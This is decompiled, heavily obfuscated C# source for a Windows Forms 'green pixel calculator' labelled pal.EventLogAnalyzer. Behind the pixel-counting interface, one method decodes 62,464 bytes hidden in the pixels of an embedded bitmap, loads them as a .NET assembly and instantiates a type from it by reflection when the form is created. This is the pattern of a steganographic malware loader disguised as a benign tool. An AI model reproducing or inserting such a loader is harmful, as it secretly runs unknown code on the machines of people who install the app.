using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using pal.EventLogAnalyzer.Properties;

namespace dfb44QxstTvciGRseP;

public class tn41yh9uirecvI2ZZD : Form
{
	private object[] VCLhtf7Rga;

	private IContainer nMJhlOveH3;

	private static object oAChJ3o0bo;

	private Label gN5hAXcXiO;

	private PictureBox SmxheGtGoM;

	private Button xWKhGsUTJi;

	private Button EkIhFSw40l;

	private static tn41yh9uirecvI2ZZD KAhhFbXzNrDJSD3Ndhx;

	public tn41yh9uirecvI2ZZD()
	{
		GRgbqpcvG2cupxT0496.SF54tCZzYSfdV();
		VCLhtf7Rga = new object[3] { "4367586E7547", "656170", "pal.EventLogAnalyzer" };
		nMJhlOveH3 = null;
		((Form)this)._002Ector();
		yDDhrP2Co8();
		Type.GetType("System.Activator")!.InvokeMember("CreateInstance", BindingFlags.InvokeMethod, null, null, new object[2]
		{
			(Type)oAChJ3o0bo,
			VCLhtf7Rga
		});
	}

	private void gQXhoS2qoq(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Invalid comparison between Unknown and I4
		OpenFileDialog val;
		while (true)
		{
			val = new OpenFileDialog();
			if (eG3NPFDPm4DAX5XHHG0())
			{
				switch (0)
				{
				case 1:
					continue;
				}
			}
			break;
		}
		hedN9rDDqBe0KiKieiZ(val, "bmp|*.bmp");
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			SmxheGtGoM.set_ImageLocation(((FileDialog)val).get_FileName());
		}
	}

	private void WtBh1JnMpb(object sender, EventArgs e)
	{
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		int num = 3;
		while (true)
		{
			Color color = Color.FromArgb(96, 192, 0);
			while (true)
			{
				int num2 = 0;
				Bitmap val = new Bitmap(SmxheGtGoM.get_Image());
				int num3 = 0;
				while (true)
				{
					int num4;
					int num5;
					if (num3 < ((Image)val).get_Width())
					{
						num4 = 0;
						num5 = 0;
						if (!eG3NPFDPm4DAX5XHHG0())
						{
							goto IL_0074;
						}
						goto IL_0078;
					}
					SmxheGtGoM.set_Image((Image)(object)val);
					float num6 = (float)num2 / (float)(((Image)val).get_Width() * ((Image)val).get_Height()) * 100f;
					((Control)gN5hAXcXiO).set_Text($"A quantidade de pixels verdes é {num2:d} (ou seja, uma área equivalente a {num6:f}%)");
					return;
					IL_0093:
					num3++;
					continue;
					IL_0074:
					num5 = num;
					goto IL_0078;
					IL_0078:
					while (true)
					{
						switch (num5)
						{
						case 4:
							num4++;
							goto default;
						case 1:
						{
							Color pixel = val.GetPixel(num3, num4);
							if (!(pixel == color))
							{
								goto case 4;
							}
							goto IL_0051;
						}
						default:
							if (num4 >= ((Image)val).get_Height())
							{
								goto IL_0093;
							}
							goto case 1;
						case 2:
							break;
						case 3:
							goto end_IL_00ab;
						}
						break;
						IL_0051:
						num2++;
						val.SetPixel(num3, num4, Color.Gold);
						num5 = 4;
						if (eG3NPFDPm4DAX5XHHG0())
						{
							continue;
						}
						goto IL_0074;
					}
					break;
				}
				continue;
				end_IL_00ab:
				break;
			}
		}
	}

	private void O4shZlxs23(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && nMJhlOveH3 != null)
		{
			int num = 0;
			if (!eG3NPFDPm4DAX5XHHG0())
			{
				int num2 = default(int);
				num = num2;
			}
			switch (num)
			{
			}
			NOAOZvD7aBh0ytLiLYr(nMJhlOveH3);
		}
		((Form)this).Dispose(disposing);
	}

	private void yDDhrP2Co8()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		gN5hAXcXiO = new Label();
		SmxheGtGoM = new PictureBox();
		xWKhGsUTJi = new Button();
		int num = 6;
		if (cvuVx1DXNrTT3prahJP() != null)
		{
			goto IL_010e;
		}
		goto IL_0296;
		IL_0296:
		while (true)
		{
			switch (num)
			{
			case 9:
				break;
			case 7:
				goto IL_004a;
			case 8:
				goto IL_0066;
			case 5:
				goto IL_00af;
			case 6:
				EkIhFSw40l = new Button();
				((ISupportInitialize)SmxheGtGoM).BeginInit();
				goto IL_010e;
			case 3:
				goto IL_010e;
			case 4:
				((Control)EkIhFSw40l).set_UseWaitCursor(true);
				((Control)EkIhFSw40l).add_Click((EventHandler)WtBh1JnMpb);
				((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
				((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
				goto case 2;
			case 2:
				vGtixbDR75xsfBGqrbA(this, new Size(470, 496));
				((ControlCollection)lehWRiDIDeFeqB3unc9(this)).Add((Control)(object)EkIhFSw40l);
				num = 1;
				if (eG3NPFDPm4DAX5XHHG0())
				{
					continue;
				}
				goto default;
			default:
				((Control)EkIhFSw40l).set_Text("Detectar Pixels");
				((ButtonBase)EkIhFSw40l).set_UseVisualStyleBackColor(true);
				goto case 4;
			case 1:
				((Control)this).get_Controls().Add((Control)(object)xWKhGsUTJi);
				((Control)this).get_Controls().Add((Control)(object)SmxheGtGoM);
				((Control)this).get_Controls().Add((Control)(object)gN5hAXcXiO);
				((Control)this).set_Name("Form1");
				((Control)this).set_Text("Calculadora de Pixels Verdes");
				((Control)this).set_UseWaitCursor(true);
				((Form)this).add_Load((EventHandler)O4shZlxs23);
				((ISupportInitialize)SmxheGtGoM).EndInit();
				((Control)this).ResumeLayout(false);
				VqVFXtmvFZ();
				return;
			}
			break;
		}
		goto IL_0036;
		IL_00af:
		((Control)EkIhFSw40l).set_Name("btPixelDetect");
		((Control)EkIhFSw40l).set_Size(new Size(125, 35));
		((Control)EkIhFSw40l).set_TabIndex(3);
		num = 0;
		if (!eG3NPFDPm4DAX5XHHG0())
		{
			int num2 = default(int);
			num = num2;
		}
		goto IL_0296;
		IL_010e:
		((Control)this).SuspendLayout();
		((Control)gN5hAXcXiO).set_AutoSize(true);
		Qw9V1SDZal1iiWcqbjJ(gN5hAXcXiO, new Point(12, 474));
		((Control)gN5hAXcXiO).set_Name("lblResultPixels");
		((Control)gN5hAXcXiO).set_Size(new Size(0, 13));
		((Control)gN5hAXcXiO).set_TabIndex(0);
		((Control)gN5hAXcXiO).set_UseWaitCursor(true);
		((Control)SmxheGtGoM).set_Location(new Point(13, 12));
		((Control)SmxheGtGoM).set_Name("pictureBox1");
		((Control)SmxheGtGoM).set_Size(new Size(446, 360));
		SmxheGtGoM.set_TabIndex(1);
		SmxheGtGoM.set_TabStop(false);
		((Control)SmxheGtGoM).set_UseWaitCursor(true);
		((Control)xWKhGsUTJi).set_Location(new Point(333, 387));
		((Control)xWKhGsUTJi).set_Name("btLoadImg");
		goto IL_0036;
		IL_0036:
		CfaYjPDsp4983l1bqJe(xWKhGsUTJi, new Size(125, 37));
		goto IL_004a;
		IL_004a:
		((Control)xWKhGsUTJi).set_TabIndex(2);
		((Control)xWKhGsUTJi).set_Text("Imagem...");
		goto IL_0066;
		IL_0066:
		((ButtonBase)xWKhGsUTJi).set_UseVisualStyleBackColor(true);
		zXgNOmDuoeshKh8jjCk(xWKhGsUTJi, bool_0: true);
		((Control)xWKhGsUTJi).add_Click((EventHandler)gQXhoS2qoq);
		((Control)EkIhFSw40l).set_Location(new Point(334, 430));
		goto IL_00af;
	}

	public virtual void VqVFXtmvFZ()
	{
		MFjYxSDgfwpPA9LIXZw("");
	}

	private static string zIchcvtnFM(string string_0)
	{
		int num = 2;
		int num6 = default(int);
		byte[] array = default(byte[]);
		int num5 = default(int);
		int num4 = default(int);
		Bitmap val = default(Bitmap);
		while (true)
		{
			int num2 = 0;
			int num3 = 1;
			if (!eG3NPFDPm4DAX5XHHG0())
			{
				goto IL_006a;
			}
			goto IL_009b;
			IL_009b:
			while (true)
			{
				switch (num3)
				{
				case 4:
					num6 = 0;
					goto IL_0011;
				default:
					array[num2] = (byte)num5;
					num6++;
					goto IL_0011;
				case 3:
					num4++;
					goto IL_0076;
				case 1:
					array = new byte[62464];
					val = Resources.KXjh0vpaoZ();
					num4 = 0;
					goto IL_0076;
				case 2:
					break;
					IL_0076:
					if (num4 >= 62464)
					{
						oAChJ3o0bo = CE2hHfTMJ6(Assembly.Load(array)).GetTypes()[1];
						return string_0;
					}
					goto case 4;
					IL_0011:
					if (num6 < 1)
					{
						qtyh75qTq0(val, num4, num6);
						Color pixel = val.GetPixel(num4, num6);
						num5 = ColorTranslator.ToWin32(pixel);
						num3 = 0;
						if (cvuVx1DXNrTT3prahJP() != null)
						{
							continue;
						}
						goto default;
					}
					goto IL_0057;
				}
				break;
				IL_0057:
				num2++;
				num3 = 3;
				if (cvuVx1DXNrTT3prahJP() == null)
				{
					continue;
				}
				goto IL_006a;
			}
			continue;
			IL_006a:
			num3 = num;
			goto IL_009b;
		}
	}

	private static Color qtyh75qTq0(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	private static Assembly CE2hHfTMJ6(object object_0)
	{
		return (Assembly)object_0;
	}

	internal static bool eG3NPFDPm4DAX5XHHG0()
	{
		return KAhhFbXzNrDJSD3Ndhx == null;
	}

	internal static tn41yh9uirecvI2ZZD cvuVx1DXNrTT3prahJP()
	{
		return KAhhFbXzNrDJSD3Ndhx;
	}

	internal static void hedN9rDDqBe0KiKieiZ(object object_0, object object_1)
	{
		((FileDialog)object_0).set_Filter((string)object_1);
	}

	internal static void NOAOZvD7aBh0ytLiLYr(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}

	internal static void Qw9V1SDZal1iiWcqbjJ(object object_0, Point point_0)
	{
		((Control)object_0).set_Location(point_0);
	}

	internal static void CfaYjPDsp4983l1bqJe(object object_0, Size size_0)
	{
		((Control)object_0).set_Size(size_0);
	}

	internal static void zXgNOmDuoeshKh8jjCk(object object_0, bool bool_0)
	{
		((Control)object_0).set_UseWaitCursor(bool_0);
	}

	internal static void vGtixbDR75xsfBGqrbA(object object_0, Size size_0)
	{
		((Form)object_0).set_ClientSize(size_0);
	}

	internal static object lehWRiDIDeFeqB3unc9(object object_0)
	{
		return ((Control)object_0).get_Controls();
	}

	internal static object MFjYxSDgfwpPA9LIXZw(object object_0)
	{
		return zIchcvtnFM((string)object_0);
	}
}
